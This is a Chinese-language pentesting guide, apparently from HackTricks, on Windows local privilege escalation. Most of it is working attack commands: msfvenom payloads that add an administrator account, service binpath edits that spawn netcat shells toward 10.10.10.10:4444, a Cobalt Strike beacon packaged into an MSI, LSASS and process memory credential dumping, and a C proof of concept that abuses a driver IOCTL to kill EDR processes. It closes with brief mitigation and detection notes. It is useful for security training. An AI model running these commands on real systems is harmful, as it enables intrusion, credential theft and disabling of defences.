# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows 本地权限提升 攻击向量 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows 基础理论

### Access Tokens

**如果你不知道什么是 Windows Access Tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不知道 Windows 中的 integrity levels 是什么，请在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中有多种机制可能会**阻止你枚举系统**、运行可执行文件，甚至**检测到你的活动**。你应该在开始 privilege escalation 枚举之前**阅读**以下**页面**并**枚举**所有这些**防御****机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## 系统信息

### 版本信息枚举

检查该 Windows 版本是否存在已知漏洞（也检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞利用

这个 [site](https://msrc.microsoft.com/update-guide/vulnerability) 对于查找 Microsoft 安全漏洞的详细信息十分有用。该数据库包含超过 4,700 个安全漏洞，显示出 Windows 环境所呈现的 **巨大的攻击面**。

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 内嵌了 watson)_

**基于系统信息的本地检测**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github 漏洞利用仓库：**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

有没有任何凭证/敏感信息保存在环境变量中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道执行的详细信息会被记录，包含已执行的命令、命令调用以及脚本的部分内容。然而，完整的执行细节和输出结果可能不会被捕获。

To enable this, follow the instructions in the "Transcript files" section of the documentation, opting for **"Module Logging"** instead of **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell 日志的最后 15 条事件，您可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

捕获脚本执行的完整活动与全部内容记录，确保每个代码块在运行时逐一被记录。此过程保留了每项活动的全面审计追踪，对取证和恶意行为分析非常有价值。通过在执行时记录所有活动，可以获得对该过程的详细洞见。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
有关 Script Block 的日志事件可以在 Windows Event Viewer 的以下路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
要查看最近 20 条事件，可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，可以利用该情况攻破系统。

首先通过在 cmd 中运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中使用以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到如下回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 或 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 等于 `1`。

那么， **it is exploitable.** 如果上述注册表值等于 `0`，则 WSUS 条目将被忽略。

为了利用这些漏洞，你可以使用例如以下工具： [Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus) — 这些是用于向非 SSL 的 WSUS 流量注入“fake”更新的 MiTM weaponized exploits 脚本。

阅读相关研究：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**在此阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，这就是该 bug 利用的缺陷：

> 如果我们有权限修改本地用户的代理设置，且 Windows Updates 使用 Internet Explorer 设置中配置的代理，那么我们就可以在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截自身流量，并以提升权限的用户在本机上运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也会使用当前用户的证书存储。如果我们为 WSUS 主机名生成自签名证书并将该证书添加到当前用户的证书存储中，我们将能够拦截 HTTP 和 HTTPS 的 WSUS 流量。WSUS 未采用类似 HSTS 的机制来对证书实现首次使用信任（trust-on-first-use）类型的验证。如果呈现的证书被用户信任且主机名正确，服务将接受该证书。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（一旦可用）来 exploit 该漏洞。

## 第三方自动更新程序和 Agent IPC (local privesc)

许多企业 agent 暴露本地回环的 IPC 界面和一个有特权的更新通道。如果可以将 enrollment 强制到攻击者服务器，且更新程序信任一个恶意根 CA 或签名验证薄弱，本地用户就能传递一个由 SYSTEM 服务安装的恶意 MSI。参见基于 Netskope stAgentSvc 链的通用技术（CVE-2025-0309）：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

在特定条件下，Windows **domain** 环境存在一个 **local privilege escalation** 漏洞。这些条件包括：**LDAP signing is not enforced,** 用户拥有允许他们配置 **Resource-Based Constrained Delegation (RBCD)** 的自助权限，以及用户能够在域内创建计算机。需要注意的是，这些 **requirements** 在 **default settings** 下就已满足。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 找到该 **exploit**。

有关攻击流程的更多信息，请参阅 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** 这两个注册表项被 **enabled**（值为 **0x1**），则任何权限的用户都可以以 NT AUTHORITY\\**SYSTEM** 的身份 **install**（执行）`*.msi` 文件。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术。

### PowerUP

使用 power-up 中的 `Write-UserAddMSI` 命令在当前目录创建一个用于提权的 Windows MSI 二进制文件。该脚本会写出一个预编译的 MSI 安装程序，提示添加用户/组（因此你需要 GUI 访问权限）：
```
Write-UserAddMSI
```
只需执行生成的二进制文件即可提升权限。

### MSI Wrapper

阅读本教程以学习如何使用这些工具创建 MSI 封装器。注意，如果您只是想执行命令行，可以封装一个 "**.bat**" 文件。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- 使用 Cobalt Strike 或 Metasploit **生成** 一个新的 **Windows EXE TCP payload** 到 `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 为项目命名，例如 **AlwaysPrivesc**，将位置设置为 **`C:\privesc`**，选择将解决方案和项目放在同一目录，并点击 **Create**。
- 不断点击 **Next**，直到到达第 3 步（选择要包含的文件）。点击 **Add** 并选择刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中高亮 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 改为 **x64**。
- 你可以修改其他属性，例如 **Author** 和 **Manufacturer**，可以让已安装的应用看起来更合法。
- 右键项目并选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**构建**。
- 如果显示警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI Installation

要在后台执行恶意 `.msi` 文件的 **安装：**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，您可以使用： _exploit/windows/local/always_install_elevated_

## 杀毒软件与检测器

### 审计设置

这些设置决定了哪些内容会被**记录**，因此你应当注意
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志被发送到何处很有趣
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 旨在用于 **管理本地 Administrator 密码**，确保加入域的计算机上的每个密码都是 **唯一、随机且定期更新**。这些密码安全地存储在 Active Directory 中，并且只有通过 ACLs 授予了足够权限的用户才能访问，从而在被授权时查看本地管理员密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service)。\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

自 **Windows 8.1** 起，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以 **阻止** 不受信任的进程尝试 **读取其内存** 或注入代码，从而进一步保护系统.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 首次引入于 **Windows 10**。其目的是保护设备上存储的凭据，防范诸如 pass-the-hash 攻击等威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** 由 **Local Security Authority** (LSA) 认证并被操作系统组件使用。 当用户的登录数据被已注册的安全包认证时，通常会为该用户建立 domain credentials。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查自己所属的任何组是否具有可利用的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你 **属于某些特权组，你可能能够提升权限**。在此了解特权组以及如何滥用它们以提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操纵

**了解更多** 关于 什么是 **token** 的内容，请参见本页：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看以下页面以 **了解有趣的 tokens** 及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行的进程

### 文件和文件夹权限

首先，列出进程并**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖正在运行的某个二进制文件**，或者你是否对该二进制文件所在文件夹具有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否存在可能的 [**electron/cef/chromium debuggers** 运行中，你可以滥用它来提升权限](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用 sysinternals 的 **procdump** 对正在运行的进程创建内存转储。像 FTP 这样的服务在内存中通常会有 **credentials in clear text in memory**，尝试转储内存并读取这些凭据。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用程序可能允许用户生成 CMD，或浏览目录。**

示例: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## 服务

Service Triggers 允许 Windows 在某些条件发生时启动服务（named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.）。即使没有 SERVICE_START 权限，你通常也可以通过触发它们的触发器来启动有特权的服务。请参阅此处的枚举和激活技术：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 来获取服务的信息
```bash
sc qc <service_name>
```
建议准备来自 _Sysinternals_ 的 binary **accesschk**，用于检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何服务:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到以下错误（例如 SSDPSRV）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

你可以使用以下命令启用它：
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意 upnphost 服务依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**另一个变通方法** 来解决此问题是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在某个服务上，“Authenticated users” 组拥有 **SERVICE_ALL_ACCESS** 权限的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
权限可以通过以下特权进行提权：

- **SERVICE_CHANGE_CONFIG**：允许重新配置服务二进制文件。
- **WRITE_DAC**：允许重新配置权限，从而可以更改服务配置。
- **WRITE_OWNER**：允许获取所有权并重新配置权限。
- **GENERIC_WRITE**：继承更改服务配置的能力。
- **GENERIC_ALL**：同样继承更改服务配置的能力。

要检测和利用此漏洞，可使用 _exploit/windows/local/service_permissions_。

### Services binaries weak permissions

**检查是否可以修改由服务执行的二进制文件** 或者 是否对二进制文件所在的文件夹具有 **写权限** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
您可以使用 **wmic**（不在 system32）获取服务执行的所有二进制文件，并使用 **icacls** 检查您的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**：
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以通过执行以下操作来**检查**你对服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被更改。

要更改被执行二进制的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory permissions

如果你对某个注册表拥有此权限，这意味着 **你可以从该注册表创建子注册表**。在 Windows services 的情况下，这 **足以执行任意代码：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 未加引号的 Service Paths

如果可执行文件的路径没有用引号括起来，Windows 会尝试执行路径中每个空格之前的部分。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 会尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径，排除属于内置 Windows 服务的：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并利用** 这个漏洞使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动使用 metasploit 创建一个服务二进制文件:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定当服务失败时要执行的操作。该功能可以配置为指向一个二进制可执行文件。如果该二进制可被替换，则可能发生 privilege escalation。更多细节可见 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## 应用程序

### 已安装的应用程序

检查 **二进制文件的权限**（也许你可以覆盖其中一个并 escalate privileges）和 **文件夹** 的权限（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某些配置文件以读取某些特殊文件，或者是否可以修改将由 Administrator 帐户执行的某个二进制文件（schedtasks）。

在系统中查找弱文件夹/文件权限的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 启动时运行

**检查是否可以覆盖某些将由不同用户执行的注册表项或二进制文件。**\
**阅读** **以下页面** 以了解更多有关有趣的 **autoruns 位置以提权**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能的 **第三方 异常/易受攻击** 驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果一个 driver 暴露了一个 arbitrary kernel read/write primitive（在设计不良的 IOCTL handlers 中很常见），你可以通过直接从 kernel memory 窃取 SYSTEM token 来进行权限提升。See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### 滥用 device objects 上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些签名的第三方 driver 使用 IoCreateDeviceSecure 用强 SDDL 创建其 device object，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。如果没有这个标志，当通过包含额外组件的路径打开设备时，secure DACL 不会被强制执行，从而允许任何非特权用户通过使用如下 namespace path 来获得一个 handle：

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

一旦用户能打开该设备，driver 暴露的特权 IOCTLs 可以被滥用于 LPE 和 篡改。实战中观察到的示例能力：
- 将完全访问权限的 handles 返回给任意进程（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 不受限制的 raw disk read/write（离线篡改、引导时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许从 user land 通过 kernel 杀掉 AV/EDR。

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.

Detection ideas for defenders
- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.


## PATH DLL Hijacking

如果你在 **PATH 所包含的文件夹内具有写权限**，你可能能够劫持进程加载的 DLL 并 **提升权限**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## 网络

### 共享
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否硬编码了其他已知计算机
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查**受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
